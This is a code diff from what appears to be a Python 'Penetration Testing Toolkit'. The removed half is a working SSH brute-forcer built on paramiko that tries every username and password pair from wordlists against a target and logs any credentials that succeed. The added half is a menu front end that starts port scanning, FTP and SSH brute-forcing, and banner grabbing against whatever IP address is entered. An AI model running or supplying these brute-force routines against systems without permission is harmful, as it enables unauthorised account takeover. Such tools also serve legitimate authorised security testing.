@@ -1,36 +1,44 @@
-import paramiko
-import time
-from modules.logger import log_result
+from modules import port_scanner
+from modules import ftp_bruteforce
+from modules import banner_grabber
+from modules import ssh_bruteforce
 
-def ssh_bruteforce(target, port, userlist, passlist):
-    print(f"[+] Starting SSH brute-force on {target}:{port}")
-    log_result(f"Starting SSH brute-force on {target}:{port}")
+def show_menu():
+    print("=== Penetration Testing Toolkit ===")
+    print("1. Port Scanner")
+    print("2. FTP Brute Forcer")
+    print("3. Banner Grabber")
+    print("4. SSH Brute Forcer")
+    print("5. Exit")
 
-    try:
-        with open(userlist, 'r') as users, open(passlist, 'r') as passwords:
-            for username in users:
-                username = username.strip()
-                passwords.seek(0)
-                for password in passwords:
-                    password = password.strip()
-                    ssh = None
-                    try:
-                        ssh = paramiko.SSHClient()
-                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                        ssh.connect(target, port=port, username=username, password=password, timeout=5)
-                        print(f"[SUCCESS] {username}:{password}")
-                        log_result(f"[SUCCESS] {username}:{password}")
-                        return
-                    except paramiko.AuthenticationException:
-                        print(f"[FAILED] {username}:{password}")
-                        log_result(f"[FAILED] {username}:{password}")
-                    except Exception as e:
-                        print(f"[ERROR] {e}")
-                        log_result(f"[ERROR] {e}")
-                    finally:
-                        if ssh:
-                            ssh.close()
-                    time.sleep(1)  # delay between attempts
-    except FileNotFoundError:
-        print("[!] Username or password file not found.")
-        log_result("Username or password file not found.")
+def main():
+    while True:
+        show_menu()
+        choice = input("Select an option: ")
+        if choice == "1":
+            target = input("Enter target IP address: ")
+            port_scanner.scan_ports(target)
+        elif choice == "2":
+            target = input("Enter FTP target IP address: ")
+            userlist = input("Enter path to username list file: ")
+            passlist = input("Enter path to password list file: ")
+            port = 2122
+            ftp_bruteforce.ftp_bruteforce(target, userlist, passlist, port)
+        elif choice == "3":
+            ip = input("Enter target IP address: ")
+            port = int(input("Enter port number: "))
+            banner_grabber.grab_banner(ip, port)
+        elif choice == "4":
+            target = input("Enter SSH target IP address: ")
+            port = int(input("Enter SSH port (usually 22): "))
+            userlist = input("Enter path to username list file: ")
+            passlist = input("Enter path to password list file: ")
+            ssh_bruteforce.ssh_bruteforce(target, port, userlist, passlist)
+        elif choice == "5":
+            print("Exiting...")
+            break
+        else:
+            print("Invalid choice. Try again.")
+
+if __name__ == "__main__":
+    main()
